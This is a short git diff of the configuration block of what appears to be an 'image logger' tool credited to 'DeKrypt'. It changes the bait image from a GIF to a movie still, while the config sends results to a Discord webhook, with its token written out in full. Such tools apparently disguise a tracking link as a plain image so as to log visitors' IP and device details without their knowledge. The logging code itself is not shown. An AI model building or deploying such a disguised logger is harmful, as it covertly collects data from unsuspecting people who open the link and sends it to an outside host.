@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1351867418162761798/ybbnflatDQVhWEdm9OIpKn_v8l9hNJzmtxFgDqe55BKtMC2g2QiJvhLvy-thEz2u_DLt",
-    "image": "https://tenor.com/view/oh-wow-you-dont-say-michael-office-wow-michael-scott-gif-11124235989547302113?quality=lossless", # You can also have a custom image by using a URL argument
+    "image": "https://static1.colliderimages.com/wordpress/wp-content/uploads/2022/12/puss-in-boots-the-last-wish-the-wolf-2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
